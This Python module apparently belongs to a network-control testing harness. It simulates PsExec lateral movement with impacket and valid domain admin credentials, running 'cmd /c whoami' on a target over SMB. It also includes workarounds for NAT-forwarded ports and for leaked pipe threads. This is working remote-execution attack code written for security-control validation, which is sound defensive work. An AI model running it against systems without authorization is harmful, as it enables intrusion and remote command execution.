"""PsExec lateral movement via impacket-psexec. Tests SMB/RPC segmentation
+ IPS PsExec signature. Needs valid admin creds (core.DEFAULT_CREDENTIALS)
and SMB (445) reachable to the target.

For a target registered in modules/_portpatch.py:CUSTOM_PORT_TARGETS
(real SMB(445) not directly reachable, only a NAT-forwarded alternate is
— see test2.py for the full writeup), this switches to calling
impacket's PSEXEC class in-process instead of shelling out to the
impacket-psexec CLI, since only an in-process call can be patched (a
subprocess doesn't inherit our socket redirect). For every other target,
behaviour is byte-for-byte the same ctx.run_cmd(...) call as before —
this only changes anything for a registered NAT'd target.

psexec.py ships only as a Kali doc "example" script, not inside the
importable impacket.examples package, so the in-process path loads it
from disk by path rather than a normal import.
"""
import io
import sys
import contextlib
import importlib.util

from modules import _portpatch

META = {
    "id": "psexec",
    "name": "PsExec Lateral Movement",
    "category": "AD Exploitation",
    "test_type": "attack_sim",
    "family": "D",
    "control": "Segmentation (SMB/RPC) + IPS signature",
    "fix": "SD-WAN",
    "mitre": ['T1021.002', 'T1569.002'],
    "cwe": [],
    "tactic": 'Lateral Movement',
    "requires": [],                 # uses the impacket PYTHON lib in-process
    "requires_py": ["impacket"],    # (CLI name varies; the lib is the real dep)
    "serial": True,  # in-process impacket + _portpatch swap process-global socket.connect / redirect stdout — must run ALONE (see dcsync.py)
    "ports": [("tcp", 445)],
    "success_regex": r"nt authority\\system|Creating service|Starting service|SVCManager|Opening SVCManager",
    "blocked_regex": r"STATUS_ACCESS_DENIED|rpc_s_access_denied|timed out|refused|unreachable|Errno",
}

_PSEXEC_SCRIPT = "/usr/share/doc/python3-impacket/examples/psexec.py"


def _load_psexec_class():
    spec = importlib.util.spec_from_file_location("_impacket_psexec_script", _PSEXEC_SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    # Register before exec so impacket's NDR (de)marshalling can resolve
    # classes via sys.modules[cls.__module__] — see the same fix in
    # modules/petitpotam.py for the failure mode this avoids.
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    _throttle_leaked_pipe_threads(mod)
    return mod.PSEXEC


def _throttle_leaked_pipe_threads(mod):
    """PSEXEC.doStuff() always starts RemoteStdOutPipe/RemoteStdErrPipe
    daemon threads (even for a single one-shot command, since RemCom
    streams output over the pipe as it happens). Their run() loop is a
    bare `while True: try: self.server.readFile(...) except: pass` with
    no backoff — once the service is uninstalled (right after our
    command finishes), every readFile() fails instantly and the thread
    busy-loops forever at ~100% of a core. daemon=True only guarantees
    they die when the *process* exits; for a one-shot script that's true
    moments later, so this was invisible there — but for a long-lived
    process (the GUI), every PsExec run leaks two more threads that never
    stop, and CPU usage climbs with every iteration (confirmed: 3
    iterations -> 6 threads pinned near 100% each, starving the process).

    Can't safely kill a Python thread, so instead: sleep on failure. This
    only affects the read path's *retry* timing — a working read is
    untouched, so live command output isn't delayed."""
    import time as _time
    original_connect_pipe = mod.Pipes.connectPipe

    def _patched_connect_pipe(self):
        original_connect_pipe(self)
        if self.server is not None:
            original_read_file = self.server.readFile

            def _throttled_read_file(*args, **kwargs):
                try:
                    return original_read_file(*args, **kwargs)
                except Exception:
                    _time.sleep(0.5)
                    raise
            self.server.readFile = _throttled_read_file

    mod.Pipes.connectPipe = _patched_connect_pipe


def _run_in_process(target, ctx):
    header = "# PsExec (in-process impacket) vs %s [custom-port patch active]\n\n" % target
    _portpatch.install(target)
    buf = io.StringIO()
    try:
        PSEXEC = _load_psexec_class()
        executer = PSEXEC(
            "cmd /c whoami", None, None, None, 445,
            ctx.creds["dc_user"], ctx.creds["dc_pass"], ctx.creds["domain"],
            hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
            serviceName="",  # PSEXEC() defaults this to None, unlike the CLI (which uses '')
        )
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
            try:
                executer.run(target, target)
            except SystemExit as e:
                buf.write(f"\n[exit code {e.code}]\n")
        return header + buf.getvalue()
    except Exception as e:
        import traceback
        return header + buf.getvalue() + f"\n[ERROR] {type(e).__name__}: {e}\n{traceback.format_exc()}"
    finally:
        _portpatch.remove()


def run(target, ctx):
    # PsExec authenticates over SMB with admin creds — needs a password. With
    # none the impacket tool would prompt getpass (now EOFs cleanly thanks to
    # the detached stdin); skip with a clear reason instead.
    if not (ctx.creds.get("dc_pass") or "").strip():
        return ("# psexec vs %s\n\n[SKIP] no admin password configured (set "
                "HARNESS_DC_PASS / --dc-pass / credentials.env) — PsExec needs "
                "valid admin creds over SMB." % target)
    if _portpatch.is_custom_port_target(target):
        return _run_in_process(target, ctx)
    # Runs a single command (whoami) via a temporary service over SMB. Resolve the
    # impacket tool across flavours (impacket-psexec / psexec.py / example script)
    # so it isn't tied to the Kali CLI name.
    from modules import _impacket
    tool = _impacket.resolve("psexec")
    if not tool:
        return ("# psexec vs %s\n\n[SKIP] impacket not installed — psexec unavailable "
                "(pip install impacket / apt python3-impacket)." % target)
    return ctx.run_cmd(
        tool + ' {domain}/{dc_user}:{dc_pass}@{target} "cmd /c whoami"', target)
